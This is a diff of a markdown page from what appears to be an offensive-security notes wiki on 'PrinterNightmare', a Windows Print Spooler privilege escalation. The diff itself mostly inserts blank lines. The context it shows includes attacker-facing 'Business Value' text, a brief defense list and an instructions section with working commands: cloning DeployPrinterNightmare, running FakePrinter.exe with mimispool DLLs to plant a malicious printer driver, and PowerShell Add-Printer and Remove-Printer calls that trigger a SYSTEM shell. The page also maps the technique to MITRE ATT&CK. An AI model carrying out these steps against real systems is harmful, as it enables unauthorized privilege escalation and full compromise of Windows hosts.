@@ -43,11 +43,15 @@ Technical Explanation: The Windows Print Spooler service is responsible for mana
 
 Business Value: PrinterNightmare can be used by attackers to gain access to sensitive data, install malware, or take control of a system. This technique can be executed remotely and does not require any user interaction, making it a valuable tool for attackers who want to gain access to a network or system.
 
+ 
+
 ## Requirements
 
 1. Access to the target network or system
 
 1. Ability to add a malicious printer driver
+
+ 
 
 ## Defense
 
@@ -56,6 +60,8 @@ Business Value: PrinterNightmare can be used by attackers to gain access to sens
 1. Monitor the system for suspicious printer activity
 
 1. Implement least privilege access control measures
+
+ 
 
 ## Objectives
 
@@ -67,13 +73,23 @@ Business Value: PrinterNightmare can be used by attackers to gain access to sens
 
 1. Take control of the system
 
+ 
+
 # Instructions
 
 1. To execute this command, first clone the DeployPrinterNightmare repository from the Flangvik/DeployPrinterNightmare GitHub page. Then, run the FakePrinter.exe file with the arguments 32mimispool.dll, 64mimispool.dll, and EasySystemShell. This will copy certain files to specific directories, add a printer driver, add a printer, and set registry keys.
 
+ 
+
+
+
 **Code**: [[git clone https://github.com/Flangvik/DeployPrinte]]
 
+
+
 > This command is used to deploy a printer driver and printer using the DeployPrinterNightmare repository. The printer driver is added to the system by copying certain files to specific directories. The printer is then added with the name EasySystemShell. Finally, registry keys are set to ensure that the printer driver is loaded on system startup.
+
+
 
 **Command** ([[Clone DeployPrinterNightmare repository]]):
 
@@ -81,17 +97,31 @@ Business Value: PrinterNightmare can be used by attackers to gain access to sens
 git clone https://github.com/Flangvik/DeployPrinterNightmare
 ```
 
+
+
+
+
 **Command** ([[Copy required files and add printer driver]]):
 
 ```bash
 FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
 ```
 
+
+
 2. This command removes and adds a printer with the specified name and connection name respectively.
+
+ 
+
+
 
 **Code**: [[PS C:\target> $serverName  = 'printer-installed-ho]]
 
+
+
 > The command first sets the server and printer name variables. It then concatenates the server and printer name variables to form the full printer name. If the operating system is 64-bit, it appends 'x64' to the name, otherwise 'x86' is appended. The command then removes the printer with the specified name and connection name, while suppressing any error messages. Finally, it adds the printer with the specified connection name.
+
+
 
 **Command** ([[Remove Printer]]):
 
@@ -99,11 +129,17 @@ FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
 Remove-Printer -Name '\\printer-installed-host\EasySystemShell - x64' -ErrorAction SilentlyContinue
 ```
 
+
+
+
+
 **Command** ([[Add Printer]]):
 
 ```bash
 Add-Printer -ConnectionName '\\printer-installed-host\EasySystemShell - x64'
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -135,3 +171,5 @@ Add-Printer -ConnectionName '\\printer-installed-host\EasySystemShell - x64'
 - [[EoP - Printers]]
 - [[PrinterNightmare]]
 - [[Windows - Privilege Escalation]]
+
+
